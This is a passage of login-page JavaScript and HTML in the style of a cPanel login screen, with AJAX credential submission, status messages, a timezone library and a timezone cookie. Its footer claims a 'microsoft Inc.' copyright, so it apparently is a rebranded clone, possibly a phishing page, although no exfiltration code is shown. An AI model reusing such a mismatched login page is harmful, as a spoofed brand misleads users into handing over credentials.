                var click_form = DOM.get("clickthrough_form");
                var container = click_form.querySelector(".notices");
                for (n = 0; n < result.notices.length; n++) {
                    var new_p = document.createElement("p");
                    new_p.textContent = result.notices[n].content;
                    container.appendChild(new_p)
                }
                click_form.onsubmit = redirector;
                fade_out(login_form_hg);
                fade_in(click_form)
            } else {
                show_status(MESSAGES.success, "success");
                fade_out("content-container", FADE_DURATION / 2);
                redirector()
            }
        } else {
            login_form_hg.submit()
        }
        return
    } else {
        if (parseInt(response_status / 100, 10) === 4) {
            var msg_code = result && result.message;
            show_status(MESSAGES[msg_code || "invalid_login"] || MESSAGES.invalid_login, "error");
            set_status_timeout()
        } else {
            show_status(MESSAGES.network_error, "error")
        }
        show_links(document.body);
        login_button.release();
        return
    }
}
var level_classes = {info: "info-notice", error: "error-notice", success: "success-notice", warn: "warn-notice"};
var levels_regex = "";
for (var lv in level_classes)levels_regex += "|" + level_classes[lv];
levels_regex = new RegExp("\\b(?:" + levels_regex.slice(1) + ")\\b");
function show_status(message, level) {
    DOM.get("login-status-message")[_text_content] = message;
    var container = DOM.get("login-status");
    var this_class = level && level_classes[level] || level_classes.info;
    var el_class = container.className.replace(levels_regex, this_class);
    container.className = el_class;
    fade_in(container);
    reset_status_timeout()
}
var STATUS_TIMEOUT = null;
function reset_status_timeout() {
    clearTimeout(STATUS_TIMEOUT);
    STATUS_TIMEOUT = null
}
function set_status_timeout(delay) {
    STATUS_TIMEOUT = setTimeout(function () {
        fade_out("login-status")
    }, delay || 8e3)
}
var LOGIN_SUBMIT_OK = true;
document.body.onkeyup = function () {
    LOGIN_SUBMIT_OK = true
};
document.body.onmousedown = function () {
    LOGIN_SUBMIT_OK = true
};
function do_login() {
    if (LOGIN_SUBMIT_OK) {
        LOGIN_SUBMIT_OK = false;
        if (login_username_el.value.length === 0) {
            show_status(MESSAGES.no_username, "error");
            return false
        }
        hide_links(document.body);
        login_button.suppress();
        show_status(MESSAGES.authenticating, "info");
        var goto_app_query = goto_app && goto_app.value ? "&goto_app=" + encodeURIComponent(goto_app.value) : "";
        var goto_uri_query = goto_uri && goto_uri.value ? "&goto_uri=" + encodeURIComponent(goto_uri.value) : "";
        var ajax_login = new ajaxObject(login_form_hg.action, login_results);
        ajax_login.update("user=" + encodeURIComponent(login_username_el.value) + "&pass=" + encodeURIComponent(login_password_el.value) + goto_app_query + goto_uri_query, "POST")
    }
    return false
}
function _set_links_style(el, prop, val) {
    var links = el.getElementsByTagName("a");
    for (var lk = links.length - 1; lk >= 0; lk--) {
        links[lk].style[prop] = val
    }
}
function hide_links(el) {
    _set_links_style(el, "visibility", "hidden")
}
function show_links(el) {
    _set_links_style(el, "visibility", "")
}
var login_button = {
    button: login_submit_el, _suppressed_disabled: null, suppress: function () {
        if (this._suppressed_disabled === null) {
            this._suppressed_disabled = this.button.disabled;
            this.button.disabled = true
        }
    }, release: function () {
        if (this._suppressed_disabled !== null) {
            this.button.disabled = this._suppressed_disabled;
            this._suppressed_disabled = null
        }
    }, queue_disabled: function (state) {
        if (this._suppressed_disabled === null) {
            this.button.disabled = state
        } else {
            this._suppressed_disabled = state
        }
    }
};
function show_login() {
    var select_user_form = document.getElementById("select_user_form");
    select_user_form.style.display = "none";
    var login_form_hg = document.getElementById("login_form_hg");
    login_form_hg.style.visibility = "";
    var select_users_option_block = document.getElementById("select_users_option_block");
    select_users_option_block.style.display = "block";
    var login_sub = document.getElementById("login-sub");
    login_sub.style.display = "block"
}
function show_select_user() {
    var login_form_hg = document.getElementById("login_form_hg");
    login_form_hg.style.visibility = "hidden";
    var select_users_option_block = document.getElementById("select_users_option_block");
    select_users_option_block.style.display = "none";
    var select_user_form = document.getElementById("select_user_form");
    select_user_form.style.display = "block";
    var login_sub = document.getElementById("login-sub");
    login_sub.style.display = "none"
}
if (!window.JSON) {
    login_button.suppress();
    var new_script = document.createElement("script");
    new_script.onreadystatechange = function () {
        if (this.readyState === "loaded" || this.readyState === "complete") {
            this.onreadystatechange = null;
            window.JSON = {parse: window.jsonParse};
            window.jsonParse = undefined;
            login_button.release()
        }
    };
    new_script.src = "/unprotected/json-minified.js";
    document.getElementsByTagName("head")[0].appendChild(new_script)
}
try {
    login_form_hg.onsubmit = do_login;
    set_opacity(DOM.get("login-wrapper"), 0);
    LOCALE_FADES.push(fade_in("login-wrapper"));
    var preload = document.createElement("div");
    preload.id = "preload_images";
    document.body.insertBefore(preload, document.body.firstChild);
    if (window.IS_LOGOUT) {
        set_status_timeout(1e4)
    } else if (/(?:\?|&)locale=[^&]/.test(location.search)) {
        show_status(MESSAGES.session_locale)
    }
    setTimeout(function () {
        login_username_el.focus()
    }, 100)
} catch (e) {
    if (window.console) console.warn(e)
}

//jstz.min.js
/*! jstz - v1.0.4 - 2012-12-18 */
(function(e){var t=function(){"use strict";var e="s",n=function(e){var t=-e.getTimezoneOffset();return t!==null?t:0},r=function(e,t,n){var r=new Date;return e!==undefined&&r.setFullYear(e),r.setDate(n),r.setMonth(t),r},i=function(e){return n(r(e,0,2))},s=function(e){return n(r(e,5,2))},o=function(e){var t=e.getMonth()>7?s(e.getFullYear()):i(e.getFullYear()),r=n(e);return t-r!==0},u=function(){var t=i(),n=s(),r=i()-s();return r<0?t+",1":r>0?n+",1,"+e:t+",0"},a=function(){var e=u();return new t.TimeZone(t.olson.timezones[e])},f=function(e){var t=new Date(2010,6,15,1,0,0,0),n={"America/Denver":new Date(2011,2,13,3,0,0,0),"America/Mazatlan":new Date(2011,3,3,3,0,0,0),"America/Chicago":new Date(2011,2,13,3,0,0,0),"America/Mexico_City":new Date(2011,3,3,3,0,0,0),"America/Asuncion":new Date(2012,9,7,3,0,0,0),"America/Santiago":new Date(2012,9,3,3,0,0,0),"America/Campo_Grande":new Date(2012,9,21,5,0,0,0),"America/Montevideo":new Date(2011,9,2,3,0,0,0),"America/Sao_Paulo":new Date(2011,9,16,5,0,0,0),"America/Los_Angeles":new Date(2011,2,13,8,0,0,0),"America/Santa_Isabel":new Date(2011,3,5,8,0,0,0),"America/Havana":new Date(2012,2,10,2,0,0,0),"America/New_York":new Date(2012,2,10,7,0,0,0),"Asia/Beirut":new Date(2011,2,27,1,0,0,0),"Europe/Helsinki":new Date(2011,2,27,4,0,0,0),"Europe/Istanbul":new Date(2011,2,28,5,0,0,0),"Asia/Damascus":new Date(2011,3,1,2,0,0,0),"Asia/Jerusalem":new Date(2011,3,1,6,0,0,0),"Asia/Gaza":new Date(2009,2,28,0,30,0,0),"Africa/Cairo":new Date(2009,3,25,0,30,0,0),"Pacific/Auckland":new Date(2011,8,26,7,0,0,0),"Pacific/Fiji":new Date(2010,11,29,23,0,0,0),"America/Halifax":new Date(2011,2,13,6,0,0,0),"America/Goose_Bay":new Date(2011,2,13,2,1,0,0),"America/Miquelon":new Date(2011,2,13,5,0,0,0),"America/Godthab":new Date(2011,2,27,1,0,0,0),"Europe/Moscow":t,"Asia/Yekaterinburg":t,"Asia/Omsk":t,"Asia/Krasnoyarsk":t,"Asia/Irkutsk":t,"Asia/Yakutsk":t,"Asia/Vladivostok":t,"Asia/Kamchatka":t,"Europe/Minsk":t,"Australia/Perth":new Date(2008,10,1,1,0,0,0)};return n[e]};return{determine:a,date_is_dst:o,dst_start_for:f}}();t.TimeZone=function(e){"use strict";var n={"America/Denver":["America/Denver","America/Mazatlan"],"America/Chicago":["America/Chicago","America/Mexico_City"],"America/Santiago":["America/Santiago","America/Asuncion","America/Campo_Grande"],"America/Montevideo":["America/Montevideo","America/Sao_Paulo"],"Asia/Beirut":["Asia/Beirut","Europe/Helsinki","Europe/Istanbul","Asia/Damascus","Asia/Jerusalem","Asia/Gaza"],"Pacific/Auckland":["Pacific/Auckland","Pacific/Fiji"],"America/Los_Angeles":["America/Los_Angeles","America/Santa_Isabel"],"America/New_York":["America/Havana","America/New_York"],"America/Halifax":["America/Goose_Bay","America/Halifax"],"America/Godthab":["America/Miquelon","America/Godthab"],"Asia/Dubai":["Europe/Moscow"],"Asia/Dhaka":["Asia/Yekaterinburg"],"Asia/Jakarta":["Asia/Omsk"],"Asia/Shanghai":["Asia/Krasnoyarsk","Australia/Perth"],"Asia/Tokyo":["Asia/Irkutsk"],"Australia/Brisbane":["Asia/Yakutsk"],"Pacific/Noumea":["Asia/Vladivostok"],"Pacific/Tarawa":["Asia/Kamchatka"],"Africa/Johannesburg":["Asia/Gaza","Africa/Cairo"],"Asia/Baghdad":["Europe/Minsk"]},r=e,i=function(){var e=n[r],i=e.length,s=0,o=e[0];for(;s<i;s+=1){o=e[s];if(t.date_is_dst(t.dst_start_for(o))){r=o;return}}},s=function(){return typeof n[r]!="undefined"};return s()&&i(),{name:function(){return r}}},t.olson={},t.olson.timezones={"-720,0":"Etc/GMT+12","-660,0":"Pacific/Pago_Pago","-600,1":"America/Adak","-600,0":"Pacific/Honolulu","-570,0":"Pacific/Marquesas","-540,0":"Pacific/Gambier","-540,1":"America/Anchorage","-480,1":"America/Los_Angeles","-480,0":"Pacific/Pitcairn","-420,0":"America/Phoenix","-420,1":"America/Denver","-360,0":"America/Guatemala","-360,1":"America/Chicago","-360,1,s":"Pacific/Easter","-300,0":"America/Bogota","-300,1":"America/New_York","-270,0":"America/Caracas","-240,1":"America/Halifax","-240,0":"America/Santo_Domingo","-240,1,s":"America/Santiago","-210,1":"America/St_Johns","-180,1":"America/Godthab","-180,0":"America/Argentina/Buenos_Aires","-180,1,s":"America/Montevideo","-120,0":"Etc/GMT+2","-120,1":"Etc/GMT+2","-60,1":"Atlantic/Azores","-60,0":"Atlantic/Cape_Verde","0,0":"Etc/UTC","0,1":"Europe/London","60,1":"Europe/Berlin","60,0":"Africa/Lagos","60,1,s":"Africa/Windhoek","120,1":"Asia/Beirut","120,0":"Africa/Johannesburg","180,0":"Asia/Baghdad","180,1":"Europe/Moscow","210,1":"Asia/Tehran","240,0":"Asia/Dubai","240,1":"Asia/Baku","270,0":"Asia/Kabul","300,1":"Asia/Yekaterinburg","300,0":"Asia/Karachi","330,0":"Asia/Kolkata","345,0":"Asia/Kathmandu","360,0":"Asia/Dhaka","360,1":"Asia/Omsk","390,0":"Asia/Rangoon","420,1":"Asia/Krasnoyarsk","420,0":"Asia/Jakarta","480,0":"Asia/Shanghai","480,1":"Asia/Irkutsk","525,0":"Australia/Eucla","525,1,s":"Australia/Eucla","540,1":"Asia/Yakutsk","540,0":"Asia/Tokyo","570,0":"Australia/Darwin","570,1,s":"Australia/Adelaide","600,0":"Australia/Brisbane","600,1":"Asia/Vladivostok","600,1,s":"Australia/Sydney","630,1,s":"Australia/Lord_Howe","660,1":"Asia/Kamchatka","660,0":"Pacific/Noumea","690,0":"Pacific/Norfolk","720,1,s":"Pacific/Auckland","720,0":"Pacific/Tarawa","765,1,s":"Pacific/Chatham","780,0":"Pacific/Tongatapu","780,1,s":"Pacific/Apia","840,0":"Pacific/Kiritimati"},typeof exports!="undefined"?exports.jstz=t:e.jstz=t})(this);
//cptimezone_optimized.js
(function(window){"use strict";var JSTZ_RELATIVE_PATH="sharedjs/jstz.min.js";var TIMEZONE_COOKIE="timezone";var COOKIE_TIMEZONE_MISMATCH_CLASS="if-timezone-cookie-needs-update";var DETECTED_TZ_CLASS="detected-timezone";var SHOWN_CLASS="shown";function _get_cookie(sKey){return decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*"+encodeURIComponent(sKey).replace(/[\-\.\+\*]/g,"\\$&")+"\\s*\\=\\s*([^;]*).*$)|^.*$"),"$1"))||null}function _detect_timezone(){return window.jstz.determine().name()}function reset_timezone_and_reload(){return reset_timezone(location.reload.bind(location))}function _set_cookie(callback){document.cookie=TIMEZONE_COOKIE+"="+_detect_timezone()+"; path=/";if(callback){callback()}}function set_timezone_if_unset(on_success){return!_get_cookie(TIMEZONE_COOKIE)&&reset_timezone(on_success)}function reset_timezone(on_success){_set_cookie(on_success);return true}function set_timezone_and_reload_if_unset(){return set_timezone_if_unset(location.reload.bind(location))}function show_cookie_timezone_mismatch_nodes(){var detected_tz=_detect_timezone();if(detected_tz!==_get_cookie(TIMEZONE_COOKIE)){var detected_nodes=document.querySelectorAll("."+DETECTED_TZ_CLASS);[].forEach.call(detected_nodes,function(n){n.textContent=detected_tz});var show_nodes=document.querySelectorAll("."+COOKIE_TIMEZONE_MISMATCH_CLASS);[].forEach.call(show_nodes,function(n){n.className+=" "+SHOWN_CLASS})}}window.CPTimezone={show_cookie_timezone_mismatch_nodes:show_cookie_timezone_mismatch_nodes,reset_timezone_and_reload:reset_timezone_and_reload,reset_timezone:reset_timezone,set_timezone_and_reload_if_unset:set_timezone_and_reload_if_unset}})(window);        

    CPTimezone.reset_timezone();
</script>
<style type="text/css">@media (min-width: 481px) {
        #select_user_form {
            width: px;
        }
    }
</style>
<div class="copyright">Copyright&copy;&nbsp;2019 microsoft Inc.</div>
</body>
</html>